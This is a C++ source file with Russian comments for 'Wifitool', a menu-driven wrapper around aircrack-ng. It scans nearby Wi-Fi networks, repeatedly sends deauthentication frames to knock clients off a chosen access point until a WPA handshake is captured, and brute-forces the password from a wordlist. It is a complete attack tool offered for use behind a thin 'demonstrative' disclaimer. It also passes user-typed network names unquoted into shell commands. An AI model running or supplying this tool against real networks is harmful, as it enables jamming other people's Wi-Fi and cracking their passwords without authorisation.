// Подключаем библиотеки
#include <iostream>
#include <string>
#include <time.h>
#include <fstream>
#include <thread> // Компиляция данного модуля невозможна без флага -pthread
#include <signal.h>

// Упрощаем работу с std
using namespace std;

// Инициализируем переменные
int current_progress;
int unwanted_loop;
int base_system;
int i = 0;

string wireless_card = "$(iw dev | grep 'Interface' | grep 'mon' | awk '{print $2}')";
string first_run_fix = "airmon-ng stop " + wireless_card + " > /dev/null 2>&1; ifconfig " + wireless_card + " up > /dev/null 2>&1; rm -rf tmp *.csv";
string wireless_card_monitormode = "$(iw dev | grep 'Interface' | head -n 1 | awk '{print $2}')";
const char *start_func = first_run_fix.c_str();
string file_name_with_extention_of_cap;
string returning_to_managed_mode;
string target_channel_number;
string path_to_wordlist;
string unableinfo_txt;
string path_to_store;
string target_bssid;
string crack_option;
string target_name;
string user_input;

bool ctrlc_pressed = false;

// Инициализируем переменные функций
bool sniff_real_func();
bool monitor_func();
bool deauth_func2();
bool deauth_func();
bool progress(int);
bool crack_func();
bool check_func();
bool sniff_func();
bool animation();
int help_func();

// Функция, проверяющая нажатие ctrl - c
void sigint(int sig)	{
	ctrlc_pressed = true;
	return;
}

// Начало программы
int main()	{
	system(start_func);                   // Пробуем восстановить работу сетевых карт и зачищаем остаточные файлы (Восстановление после предыдущего запуска)
	progress(0);                          // Выводим строку прогресса
	cout << "\n                   Wifitool v0.1" << endl;
	cout << "\n\n[!] Внимание!" << endl;    // Дисклеймер
	cout << "Данная программа несёт демонстративный характер." << endl;
	cout << "Мы не неёсем ответственности за ваши действия." << endl;
	cout << "\n[?] Введите '0' или '?' для справки.\n\n";
	while(true)	{
		cout << "WiFi Tool: ";        // Создаём иллюзию командной оболочки
		cin >> user_input;            // Ожидаем ввод
		if(user_input == "0" || user_input == "?"){help_func();} // Если ввели 0, Запускаем функцию help_func()
		else if(user_input == "1"){check_func();}                // Если ввели 1, Запускаем функцию check_func()
		else if(user_input == "2"){monitor_func();}              // Если ввели 2, Запускаем функцию monitor_func()
		else if(user_input == "3")	{                        // Если ввели 3
			system("mkdir tmp");			// Создаём папку tmp/
			thread t3(sniff_real_func);             // Инициализируем функцию для работы в многопоточном (параллельном) режиме
			t3.detach();                            // Запускаем функцию и продолжаем работу кода
			sniff_func();                           // Запускаем функцию
		}

		else if(user_input == "4")	{               // Если ввели 4
			progress(70);				// Выводим строку прогресса
			thread t1(deauth_func);                 // Инициализируем функцию для работы в многопоточном (параллельном) режиме
			t1.detach();                            // Запускаем функцию и продолжаем работу кода
			animation();                            // при помощи этой КРАСИВОЙ функции задержки, aireplay-ng не выдает ошибку и начинает деаут на правильном канале!
			progress(80);                           // Выводим строку прогресса
			cout << "\n[!] Как только получите хендшейк, нажмите в этом окне 'ctrl - c'" << endl;
			signal(SIGINT, sigint);                 // Захватываем ctrl - c для остановки aireplay-ng
			for(;;) {
				if (!ctrlc_pressed) {           // Если ctrl - c НЕ нажата
					deauth_func2();         // Запускаем функцию, глушащую сеть
					system("sleep 6");      // переодичность запуска глушилки. Для того, чтобы дать AP отдышаться.
				}
				else {                          // Если ctrl - c нажата
					goto End;               // Выходим из цикла
				}
			}
			End:                                    // Результат выхода из цика
				progress(90);                   // Выводим строку прогресса
			cout << "\n[+] Хендшейк пойман. Для брутфорса запустите [5].\n" << endl;

		}
		else if(user_input == "5"){crack_func();}       // Если ввели 5, Запускаем функцию crack_func()
		else {cout << "[-] Команда не распознана. Введите [0] или [?] для справки.\n\n";}      // Если введена неверная команда
	}
}

// Функция показа справки
int help_func()	{
	progress(current_progress);    // Выводим АКТУАЛЬНУЮ строку прогресса

	cout << "\n[1] Для проверки и установки необходимых компонентов." << endl;
	cout << "[2] Для перевода сетевой карты в режим монитора." << endl;
	cout << "[3] Для прослушки сетей." << endl;
	cout << "[4] Для перехвата хендшейка." << endl;
	cout << "[5] Для перебора пароля\n" << endl;
	return 0;
}



// Функция проверки необходимых компонентов
bool check_func()	{
	progress(5);              // Выводим строку прогресса
	cout << "\nПроверка необходимых компонентов....." << endl;
	if (system("which aircrack-ng > /dev/null 2>&1"))	{      // Если компонент отсутствует в системе
		system("apt-get update && apt-get install -y aircrack-ng");         // Устанавливаем компонент
		check_func();     // Перезапускаем функцию проверки чтобы убедиться, что компонент установился
	}

	else if (system("which xterm > /dev/null 2>&1"))	{
		system("apt-get update && apt-get install -y xterm");
		check_func();
	}
	else	{
	progress(10);             // Выводим строку прогресса
	cout << "\n[!] Все компоненты уже установлены! Можете продолжать работу.\n" << endl;
	}
	return true;
}

// Функция переключения беспроводной сетевой карты в режим монитора
bool monitor_func()	{
	progress(15);      // Выводим строку прогресса
	system("xterm -title 'Переводим карту в режим монитора...' -e sudo airmon-ng check kill > /dev/null 2>&1"); // Убиваем все процессы (демоны), которые используются на данный момент сетевой картой
	progress(20);      // Выводим строку прогресса
	string monitor_mode = "xterm -title 'Переводим карту в режим монитора...' -e sudo airmon-ng start " + wireless_card + " > /dev/null 2>&1"; //пробуем перевести выбранную? карту в режим монитора
	const char *firing_command_monitor_mode = monitor_mode.c_str();
	system(firing_command_monitor_mode);
	progress(25);      // Выводим строку прогресса
	cout << "\n[+] Готово! Используйте [3] чтобы понюхать WiFi.\n" << endl;
	return 0;
}


// Функция прослушки всех wifi сетей на всех каналах
bool sniff_func()	{
	for(int q = 0; q<=33; q++)	{  // При помощи данного цикла иммитируем полосу загрузки
		progress(3 * q);
		system("sleep 0.26");
	}
	progress(60);                      // Выводим строку прогресса
	cout << endl;                      // Каретка
	system("cat nets* | sed -n '/Station/q;p' | sed '/Last time seen/d' | awk -F',' '{print $14}' | awk '{$1=$1};1' | sed -r '/^\\s*$/d'"); // Считываем содержимое nets.csv-01.csv и выводим список сетей
	cout << "\n[?] Перепишите название вашей сети (регистр учитывается): ";
	getline(cin >> ws, target_name);   // Необычный способ считать данные (Название сети) с использованием getline. Источник:  

	progress(70);                      // Выводим строку прогресса

	string netname = "cat nets.csv-01.csv | sed -n '/Station/q;p' | sed '/Last time seen/d' | grep '" + target_name + "' | awk -F',' '{print $14}' > tmp/netname.txt";
	const char *netname_init = netname.c_str();

	string netbssid = "cat nets.csv-01.csv | sed -n '/Station/q;p' | sed '/Last time seen/d' | grep '" + target_name + "' | awk -F',' '{print $1}' > tmp/netbssid.txt";
	const char *netbssid_init = netbssid.c_str();

	string channel = "cat nets.csv-01.csv | sed -n '/Station/q;p' | sed '/Last time seen/d' | grep '" + target_name + "' | awk -F',' '{print $4}' > tmp/channel.txt";
	const char *channel_init = channel.c_str();


	system(netname_init);  // Считываем содержимое nets.csv-01.csv и выводим название выбранной сети.
	system(netbssid_init); // Считываем содержимое nets.csv-01.csv и выводим MAC-адрес выбранной сети.
	system(channel_init);  // Считываем содержимое nets.csv-01.csv и выводим канал выбранной сети.


	getline(ifstream("tmp/netname.txt"), target_name);           // Считываем содержимое файла по пути tmp/netname.txt
	getline(ifstream("tmp/netbssid.txt"), target_bssid);         // Считываем содержимое файла по пути tmp/netbssid.txt
	getline(ifstream("tmp/channel.txt"), target_channel_number); // Считываем содержимое файла по пути tmp/channel.txt

	cout << "\nВыбранная сеть: " << target_name << endl;
	cout << "MAC-адрес сети: " << target_bssid << endl;
	cout << "Канал сети: " << target_channel_number << endl;


	cout << "\n[+] Данные сохранены! Можно приступить к ловле хендшейка [4].\n" << endl;
	return 0;
}


// Функция слушает только выбранную сеть и только на выбранном канале
bool deauth_func()	{
	string airodump2 = "xterm -hold -title 'Слушаем канал...' -e sudo airodump-ng " + wireless_card_monitormode + " --bssid='" + target_bssid + "' -c " + target_channel_number + " -w tmp/'" + target_name + "'.cap";
	const char *airodump_sniff_selected_ap = airodump2.c_str();
	system(airodump_sniff_selected_ap);  // Запуск команды для прослушки канала
	// TODO: Автоматом понять, что хендшейк пойман (у fluxion есть реализация)
	return 0;

}

// Функция деаутит выбранную сеть и его клиентов
bool deauth_func2()	{
	string airplay_deauth = "xterm -title 'Глушим сеть...' -e sudo aireplay-ng --deauth 7 -a " + target_bssid + " " + wireless_card_monitormode; // -c Client_MAC
	const char *deauther = airplay_deauth.c_str();
	system(deauther); // Запуск команды для деаута клиентов
	return 0;
}


// Функция начинает перебирать пароль сети с использованием списка паролей из файла list.txt
bool crack_func()	{
	system("xterm -hold -title 'Перебор пароля...' -e sudo aircrack-ng -w list.txt tmp/*.cap"); // Запуск команды для перебора
	system("cp tmp/*.cap ."); // Копируем рукопожатие
	progress(100);            // Выводим строку прогресса
	cout << "\nProgram finished!" << endl;
	system(start_func);       // Запуск команды для отчистки
	return 0;
}


bool sniff_real_func()	{
	string airodump1 = "timeout 9 xterm -title 'Поиск WiFi...' -e sudo airodump-ng " + wireless_card_monitormode + " --output-format=csv -w nets.csv --write-interval 3";
	const char *airodump_init1 = airodump1.c_str();
	system(airodump_init1);
	return 0;
}

// Элементы анимации для упрощения восприятия

// Функция иммитирует анимацию 'пружинки' для корректного запуска функции deauth_func2() на выбранном канале
bool animation() {

	for(int t=0; t<15; t++)	{
		string channel_anim = " Настраиваем сетевой канал";

		cout << "[)]" << channel_anim << "." << endl;
		system("sleep 0.1 && clear");
		cout << "[|]" << channel_anim << ".." << endl;
		system("sleep 0.1 && clear");
		cout << "[(]" << channel_anim << "..." << endl;
		system("sleep 0.1 && clear");
		cout << "[|]" << channel_anim << ".." << endl;
		system("sleep 0.1 && clear");

	}
	return 0;
}

// Функция вывода строки состояния
bool progress(int progress) {
	system("clear");
	cout << "\n[";
	int pos = progress / 2;
	for (int i = 0; i < 50; ++i) {
		if (i < pos) cout << "=";
		else if (i == pos) cout << ">";
		else cout << " ";
	}
	cout << "] " << int(progress) << " %\r";
	cout.flush();
	current_progress = progress; // Запоминаем значение аргумента полосы прогресса
	cout << endl;
	return 0;
}
